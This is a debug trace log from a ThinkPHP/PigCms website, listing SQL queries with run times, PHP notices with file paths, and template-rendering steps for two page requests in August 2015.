SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.001953s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.041992s ]
INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.042968s ]
INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.075195s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.076172s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.076172s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.077148s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.077148s ]
INFO: [ view_end ] --END-- [ RunTime:0.000977s ]

[ 2015-08-23T12:28:13+08:00 ] 121.42.0.19 /?q=node&destination=node
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
INFO: [ app_begin ] --START--
INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003907s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000977s ]
NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003906s ]
SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
INFO: [ view_template ] --START--
INFO: Run LocationTemplate Behavior [ RunTime:-0.042969s ]
INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
INFO: [ view_parse ] --START--
NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
INFO: Run ParseTemplate Behavior [ RunTime:-0.044922s ]
INFO: [ view_parse ] --END-- [ RunTime:0.034180s ]
INFO: [ view_filter ] --START--
INFO: Run ContentReplace Behavior [ RunTime:-0.079102s ]
INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081055s ]
INFO: Run ShowRuntime Behavior [ RunTime:-0.082031s ]
INFO: [ view_filter ] --END-- [ RunTime:0.003906s ]
INFO: [ view_end ] --START--
INFO: Run ShowPageTrace Behavior [ RunTime:-0.083008s ]
INFO: [ view_end ] --END-- [ RunTime:0.000976s ]

